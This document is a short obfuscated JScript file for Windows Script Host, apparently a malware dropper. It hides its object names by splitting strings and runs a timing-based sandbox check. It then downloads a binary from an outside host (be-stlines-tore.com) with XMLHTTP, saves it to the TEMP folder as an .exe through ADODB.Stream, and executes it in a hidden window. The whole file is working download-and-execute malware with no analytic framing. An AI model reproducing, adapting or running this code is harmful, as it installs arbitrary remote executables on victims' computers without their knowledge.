var XX = false;
var NT = "Create"+"Object";
var Y2 = function VO() {return WScript[NT]("WScript"+".Shell");}(), PN = 11;
var KJ = "MSXML2"+".XMLHTTP";
var E0 = 2;
var Y0 = E0 - 2;
function E(GB){Y2["Run"](GB, Y0, Y0);};
function B(){return KJ + "";};
function NO(W0, P0){Y0 = Y0 * 1; return W0 - P0;};
function Q(){return NT;};
/*@cc_on
  @if (@_win32 || @_win64)
    XX = true;
  @end
@*/
if (XX)
{
var BO = "";
function RK(){return 22;};
var WY = 0; var W = 0;
function X()
{
var M = new this["Date"]();
var DO = M["getUTCMilliseconds"]();
WScript["Sleep"](RK());
var M = new this["Date"]();
var RO = M["getUTCMilliseconds"]();
WScript["Sleep"](RK());
var M = new this["Date"]();
var Q0 = M["getUTCMilliseconds"]();
var WY = "H0";
WY = NO(RO, DO);
var W = "I";
W = NO(Q0, RO);
BO = "open";
return NO(WY, W);
}
var IR = false;
var O = false;
for (var SN = Y0; SN < RK() * 1; SN++){if (X() != Y0){
IR = true; 
W = "31" + 11 * WY + W; 
O = true; 
break;
}}
function H() {return ((IR == true) && (IR == O)) ? 1 : Y0;};
if (IR && H() && O){
function C() {return Y2["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ftguCGns.ex" + "e";};
 UM = B();
 D = WScript[NT](UM);
 var P = 1;
do { 
	for (;P;){
	try {
		if (P == 1)
		{
			D[BO]("GET", "http://be-stlines-tore.com/k3soa", false);
			D["send"]();
			PG = "Sleep";
			P = 2;
		}
		WScript[PG](RK() + 120); 
		if (D["readystate"] < 2 * 2) continue;
		P = Y0;
		function TP(DK) {var YF = (1, 2, 3, 4, 5, DK); return YF;};
		VG = WScript[Q()]("ADODB.Stream");
		UM = VG;
		UM[BO]();
		UM["type"] = TP(1);
		UM["write"](D["ResponseBody"]);
		VG["position"] = TP(Y0);
		UM["Save" + "ToFile"](C(), 2);
		VG["cl"+"ose"]();
		Y = C();
		E(Y);
	} catch(Y1){};};
}while (P);
}
}

